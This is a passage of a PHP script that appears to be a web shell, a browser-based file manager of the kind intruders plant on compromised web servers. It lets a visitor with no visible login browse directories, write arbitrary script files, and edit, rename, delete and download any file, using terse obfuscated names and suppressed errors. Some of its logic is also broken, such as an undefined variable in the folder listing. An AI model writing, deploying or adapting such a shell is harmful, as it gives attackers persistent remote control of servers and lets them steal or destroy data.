			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($dir)." ?</p>
			<form method='POST'>
				<a class='btn btn-danger btn-block btn-sm' href='?dir=".dirname($dir)."'>No</a>
				<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		if(isset($_7['filenew'])) {
		s();
		if(isset($_7['bikin'])){
			$name = $_7['name_file'];
			$contents_file = $_7['contents_file'];
			foreach ($name as $name_file){
				$handle = @fopen("$name_file", "w");
				if($contents_file){
					$create = @fwrite($handle, $contents_file);
				} else {
					$create = $handle;
				}
			}
			if($create){
				echo "<script>window.location='?path=$path'</script>";
			} else {
				echo '<strong>Create file</strong> FAIL! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm' type='text' name='name_file[]' placeholder='filename' $_r>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control form-control-sm' name='contents_file' rows='7' placeholder='your script' $_r></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='create'>
				</div>
			</form>
		</div>";
		}
		if(isset($_7['dirnew'])) {
		s();
		if(isset($_7['create'])){
			$name = $_7['name_dir'];
			foreach ($name as $name_dir){
				$folder = preg_replace("([^wsd-_~,;:[](].]|[.]{2,})", '', $name_dir);
				$fd = @mkdir ($folder);
			}
			if($fd){
				echo "<script>window.location='?path=$path'</script>";
			} else {
				echo '<strong>Create dir</strong> FAIL! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Name directory:
				<div class='input-group mb-3'>
					<input class='form-control form-control-sm' type='text' name='name_dir[]' placeholder='Dir name' $_r>
					<input class='btn btn-outline-light btn-sm' type='submit' name='create' value='create dir'>
				</div>
			</form>
		</div>";
		}
		echo '
		<div class="table-responsive">
		<table class="table table-hover table-dark text-light">
		<thead>
		<tr>
			<td class="text-center">Name</td>
				<td class="text-center">Type</td>
				<td class="text-center">Last Edit</td>
				<td class="text-center">Size</td>
				<td class="text-center">Owner<gr>/</gr>Group</td>
				<td class="text-center">Permission</td>
			<td class="text-center">Action</td>
		</tr>
		</thead>
		<tbody class="text-nowrap">
		<tr>
			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?filenew&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
					<a class="btn btn-outline-light btn-sm" href="?dirnew&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
				</div>
			</td>
		</tr>';		
		foreach($scand as $dir){
			$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
			if(strlen($dir) > 25) {
				$_d = substr($dir, 0, 25)."...";		
			}else{
				$_d = $dir;
			}
			if(function_exists('posix_getpwuid')) {
				$downer = @posix_getpwuid(fileowner("$path/$dir"));
				$downer = $downer['name'];
			} else {
				$downer = fileowner("$path/$dir");
			}
			if(function_exists('posix_getgrgid')) {
				$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
				$dgrp = $dgrp['name'];
			} else {
				$dgrp = filegroup("$path/$dir");
			}
			if(!is_dir($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);
			if($size >= 1024){
				$size = round($size/1024,2).' MB';
			}else{
				$size = $size.' KB';
			}
		if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
		echo "
		<tr>
			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href='?dir=$path/$dir'>$_d</a></td>
			<td class='text-center'>dir</td>
			<td class='text-center'>$dt</td>
			<td class='text-center'>-</td>
			<td class='text-center'>$downer<gr>/</gr>$dgrp</td>
			<td class='text-center'>";
				if(is_writable($path.'/'.$dir)) echo '<gr>';
					elseif(!is_readable($path.'/'.$dir)) echo '<rd>';
				echo p($path.'/'.$dir);
				if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>';
		echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=rename_folder'><i class='bi bi-pencil-fill'></i></a><a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
		}
		foreach($scand as $file){
			$ft = date("Y-m-d G:i", filemtime("$path/$file"));
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$path/$file"));
				$fowner = $fowner['name'];
			} else {
				$fowner = fileowner("$path/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$path/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$path/$file");
			}
			if(!is_file($path.'/'.$file)) continue;
			if(strlen($file) > 25) {
				$_f = substr($file, 0, 25)."...-.".$ext;		
			}else{
				$_f = $file;
			}
		echo "
		<tr>
		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=$path&action=view&opn=$file'>$_f</a></td>
			<td class='text-center'>file</td>
			<td class='text-center'>$ft</td>
			<td class='text-center'>".sz(filesize($file))."</td>
			<td class='text-center'>$fowner<gr>/</gr>$fgrp</td>
			<td class='text-center'>";
			if(is_writable($path.'/'.$file)) echo '<gr>';
			elseif(!is_readable($path.'/'.$file)) echo '<rd>';
				echo p($path.'/'.$file);
			if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</gr></rd></td>';
			echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
			</div>
			</td>
		</tr>";
		}
		?>
		</tbody>
		</table>
		</div><center><div class='text-secondary'><a style='color:white;text-decoration:none' target='_blank' href='#'>&copy; Galauers</a></div></center>
	</div>
</div>
</body>
</html>
